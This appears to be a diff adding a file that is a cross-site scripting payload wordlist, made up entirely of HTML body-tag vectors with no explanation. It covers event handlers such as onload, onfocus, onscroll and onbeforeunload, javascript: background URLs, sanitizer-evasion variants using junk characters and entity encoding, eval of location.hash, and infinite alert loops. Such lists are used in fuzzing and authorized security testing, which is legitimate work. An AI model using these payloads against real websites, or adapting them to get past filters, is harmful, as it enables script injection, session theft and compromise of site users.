@@ -1,0 +1,210 @@
+<BoDy%0AOnpaGeshoW=+window.prompt(1)
+<body><a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
+<BODY BACKGROUND="javascript:alert(1019)">
+<BODY BACKGROUND="javascript:alert(1652)">
+<BODY BACKGROUND="javascript:alert(1794)">
+<;BODY BACKGROUND=";javascript:alert(1878);";>;
+<BODY BACKGROUND="javascript:alert(1965)">
+<BODY BACKGROUND="javascript.:alert(244)">
+<BODY BACKGROUND="javascript:alert(738)">
+<BODY BACKGROUND=”javascript:alert(849)”>
+<;BODY BACKGROUND=";javascript:alert(';XSS';);";>;
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
+<body BACKGROUND="javascript:document.vulnerable=true;">
+<body background=javascript:'"><script>alert(1773)</script>></body>
+<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
+<body draggable="true" ondrag="alert(1)">test</body>
+<body draggable="true" ondragend="alert(1)">test</body>
+<body draggable="true" ondragenter="alert(1)">test</body>
+<body draggable="true" ondragleave="alert(1)">test</body>
+<body draggable="true" ondragstart="alert(1)">test</body>
+<body>Hello</body>
+</BODY></HTML>
+<body id=x tabindex=1 onactivate=alert(1)></body>
+<body id=x tabindex=1 onbeforeactivate=alert(1)></body>
+<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>
+<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>
+<body id=x tabindex=1 onfocus=alert(1)></body>
+<body id=x tabindex=1 onfocusin=alert(1)></body>
+BODY Image
+"> <BODY NLOAD="a();"><SCRIPT>function a(){alert(269);}</SCRIPT><"
+<body onafterprint=alert(1)>
+<body onbeforecopy="alert(1)" contenteditable>test</body>
+<body onbeforecut="alert(1)" contenteditable>test</body>
+<body onbeforepaste="alert(1)" contenteditable>test</body>
+<body onbeforeprint=alert(1)>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1220)"></body onBeforeUnload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1243)"></body onbeforeunload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(321)"></body onBeforeUnload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(344)"></body onbeforeunload>
+<body onbeforeunload="location='javascript:alert(1)'">
+<body onblur=alert(1) id=x><iframe id=x>
+<body onblur body onblur="javascript:javascript:alert(1250)"></body onblur>
+<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
+<body onblur body onblur="javascript:javascript:alert(351)"></body onblur>
+<body onclick="alert(1)">test</body>
+<body oncontextmenu="alert(1)">test</body>
+<body oncopy="alert(1)" contenteditable>test</body>
+<body oncut="alert(1)" contenteditable>test</body>
+<body ondblclick="alert(1)">test</body>
+<body onerror=alert(1) onload=/>
+<body onfocus=alert(1)>
+<body onfocus=alert(142)>
+<body onFocus body onFocus="javascript:javascript:alert(1197)"></body onFocus>
+<body onfocus body onfocus="javascript:javascript:alert(1244)"></body onfocus>
+<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
+<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+<body onFocus body onFocus="javascript:javascript:alert(298)"></body onFocus>
+<body onfocus body onfocus="javascript:javascript:alert(345)"></body onfocus>
+<body onfocusout=alert(1) id=x><iframe id=x>
+<body/onfocus=top.alert(17)>
+<body onhashchange="alert(1)">
+<body onhashchange=alert(143)><a href=#></a>
+<body onhashchange=alert(1)><a href=#x>click this!#x
+<body onhelp=alert(1)>press F1! (MSIE)
+<body oninput=javascript:alert(1485)><input autofocus>
+<body oninput=javascript:alert(1)><input autofocus>
+<body oninput=javascript:alert(571)><input autofocus>
+<body onkeydown="alert(1)" contenteditable>test</body>
+<body onkeydown body onkeydown="javascript:javascript:alert(1245)"></body onkeydown>
+<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
+<body onkeydown body onkeydown="javascript:javascript:alert(346)"></body onkeydown>
+<body onkeypress="alert(1)" contenteditable>test</body>
+<body onkeyup="alert(1)" contenteditable>test</body>
+<body onkeyup body onkeyup="javascript:javascript:alert(1237)"></body onkeyup>
+<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
+<body onkeyup body onkeyup="javascript:javascript:alert(338)"></body onkeyup>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1012)>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1646)>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1760)>
+<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(1923)>;
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(1927)>;
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(732)>
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1583)>
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(669)>
+<body onload=alert(1)>
+<BODY ONLOAD=alert(1023)>
+<body onload=alert(140)>
+<BODY ONLOAD=alert(1656)>
+<body onLoad="alert(1738);"
+<BODY ONLOAD=alert(1793)>
+<;BODY ONLOAD=alert(1879)>;
+<BODY ONLOAD=alert(1966)>
+<BODY ONLOAD=alert(245)>
+<BODY ONLOAD=alert(742)>
+<BODY ONLOAD=alert(850)>
+<BODY ONLOAD=alert(864)>
+<BODY ONLOAD=alert(987)>
+<BODY ONLOAD=alert('hellox worldss')>
+<body onLoad="alert('XSS');"
+<;BODY ONLOAD=alert(';XSS';)>;
+<BODY ONLOAD=alert("XSS")>
+<BODY ONLOAD=alert('XSS')>
+<BODY ONLOAD=alert(‘XSS’)>
+<BODY ONLOAD=alert(’XSS’)>
+<body onLoad body onLoad="javascript:javascript:alert(1206)"></body onLoad>
+<body onload body onload="javascript:javascript:alert(1240)"></body onload>
+<body onload body onload="javascript:javascript:alert(1)"></body onload>
+<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
+<body onLoad body onLoad="javascript:javascript:alert(307)"></body onLoad>
+<body onload body onload="javascript:javascript:alert(341)"></body onload>
+<body onload="document.vulnerable=true;">
+<body ONLOAD=document.vulnerable=true;>
+<body/onload=eval(location.hash.slice(85))>#alert(85)
+<body/onload=eval(location.hash.slice(94))>#javascript:alert(94)
+<body/onload=execScript(location.hash.substr(88))>#alert(88)
+<body/onload=Function(alert(81))()>
+<body/onload=Function(location.hash.slice(90))()>#alert(90)
+<BODY ONLOAD=javascript:alert(1)>
+<BODY ONLOAD=javascript:alert(1580)>
+<BODY ONLOAD=javascript:alert(666)>
+<BODY ONLOAD=javascript:javascript:alert(1)>
+<BODY ONLOAD=javascript:javascript:alert(1581)>
+<BODY ONLOAD=javascript:javascript:alert(667)>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<body/onload=&lt;!--&gt;&#11680alert(1168)>
+<body/onload=&lt;!--&gt;&#17030alert(1703)>
+<body/onload=&lt;!--&gt;&#7910alert(791)>
+<body/onload=&lt;!--&gt;&#8300alert(830)>
+<body/onload=Set.constructor(location.hash.substr(87))()>#alert(87)
+<body/onload=setTimeout(location.hash.substr(86))()>#alert(86)
+<body onLoad="while(true) alert(1764);">
+<body onLoad="while(true) alert('XSS');">
+<body onmessage=alert(1)>
+<body onmousedown="alert(1)">test</body>
+<body onmouseenter="alert(1)">test</body>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1196)"></body onMouseEnter>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(297)"></body onMouseEnter>
+<body onmouseleave="alert(1)">test</body>
+<body onmousemove="alert(1)">test</body>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(1228)"></body onMouseMove>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(329)"></body onMouseMove>
+<body onmouseout="alert(1)">test</body>
+<body onmouseover="alert(1)">test</body>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(1204)"></body onMouseOver>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(305)"></body onMouseOver>
+<body onmouseup="alert(1)">test</body>
+<body onorientationchange=alert(1)>
+<body onPageHide body onPageHide="javascript:javascript:alert(1203)"></body onPageHide>
+<body onpagehide body onpagehide="javascript:javascript:alert(1234)"></body onpagehide>
+<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
+<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
+<body onPageHide body onPageHide="javascript:javascript:alert(304)"></body onPageHide>
+<body onpagehide body onpagehide="javascript:javascript:alert(335)"></body onpagehide>
+<body onpageshow=alert(1)>
+<body onpageshow=alert(141)>
+<body onPageShow body onPageShow="javascript:javascript:alert(1212)"></body onPageShow>
+<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
+<body onPageShow body onPageShow="javascript:javascript:alert(313)"></body onPageShow>
+<body onpaste="alert(1)" contenteditable>test</body>
+<body onpopstate=alert(1)>
+<body onPopState body onPopState="javascript:javascript:alert(1231)"></body onPopState>
+<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
+<body onPopState body onPopState="javascript:javascript:alert(332)"></body onPopState>
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1201)"></body onPropertyChange>
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(302)"></body onPropertyChange>
+<body onresize="alert(1)">
+<body onresize=alert(1)>press F12!
+<body onResize body onResize="javascript:javascript:alert(1229)"></body onResize>
+<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
+<body onResize body onResize="javascript:javascript:alert(330)"></body onResize>
+<body onscroll=alert(145)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x
+<body onscroll=alert(1)><br><br><br><br>
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+<body onscroll=alert(865)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:alert(1480)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:alert(1610)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onscroll=javascript:alert(566)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:alert(696)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
+<body onUnload body onUnload="javascript:javascript:alert(1205)"></body onUnload>
+<body onunload body onunload="javascript:javascript:alert(1238)"></body onunload>
+<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
+<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
+<body onUnload body onUnload="javascript:javascript:alert(306)"></body onUnload>
+<body onunload body onunload="javascript:javascript:alert(339)"></body onunload>
+<body onunload="javascript:alert(1737);">
+<body onunload="javascript:alert('XSS');">
+<body onwheel=alert(1)>
+<body src=1189 href=1189 onerror="javascript:alert(1189)"></body>
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+<body src=290 href=290 onerror="javascript:alert(290)"></body>
+<body style="background:gray">
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body style=overflow:auto;height:144000px onscroll=alert(144) id=x>#x
